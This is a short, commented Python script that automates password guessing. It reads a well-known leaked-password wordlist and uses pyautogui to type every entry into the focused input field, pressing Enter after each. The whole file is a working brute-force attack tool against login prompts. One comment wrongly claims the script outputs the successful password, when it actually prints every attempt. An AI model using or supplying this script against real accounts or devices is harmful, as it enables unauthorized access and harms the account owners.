import os
#This import is used for automation of keyboard/mouse inputs.
import pyautogui
import time

#This part opens up a file titled "10-million-password-list-top-1000000.txt". The "r" stands for reading.
try:
   pass_file = open("10-million-password-list-top-1000000.txt", "r")
#If the file cannot be opened you will receive "Password file not opened" and then the program will quit.
except:
   print("Password file not opened")
   quit()

#Makes the program wait 5 seconds before it types anything
time.sleep(5)
#This section loops over every password password file
for password in pass_file:
    #This line removes the new-line character
    password = password.replace("\n","")
    #Tells the program to type in a password over a certain interval of time between key presses
    pyautogui.write(password, interval=0.1)
    #Press the enter key after typing in a new password
    pyautogui.press('enter')
    time.sleep(0.5)
    #Outputs the successful password
    print(password)
